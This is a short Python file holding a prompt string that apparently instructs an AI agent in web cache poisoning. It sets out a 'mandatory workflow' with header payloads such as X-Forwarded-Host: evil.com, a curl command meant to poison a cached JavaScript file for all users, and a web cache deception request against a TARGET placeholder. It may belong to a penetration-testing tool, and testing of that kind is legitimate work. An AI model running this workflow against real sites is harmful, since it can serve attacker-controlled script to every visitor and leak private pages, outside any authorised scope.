"""
Web Cache Poisoning Attack Skill Prompt.
"""
CACHE_POISONING_SKILL_PROMPT = """
## ATTACK SKILL: WEB CACHE POISONING

### MANDATORY WORKFLOW

#### STEP 1: FIND UNKEYED INPUTS
Test headers that may not be part of the cache key:
```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 8080
X-Original-URL: /admin
X-Rewrite-URL: /admin
Pragma: x-get-cache
```

#### STEP 2: POISON STATIC RESOURCES
```bash
curl -H "X-Forwarded-Host: evil.com" https://TARGET/js/main.js
# → Response contains evil.com in the body → cached → poisons all users
```

#### STEP 3: PATH CONFUSION (Web Cache Deception)
```bash
curl https://TARGET/profile/nonexistent.css
# → Returns profile page with .css extension → cached as static
```

#### ANTI-PATTERNS: Don't just test X-Forwarded-Host — there are 15+ cache headers.
"""
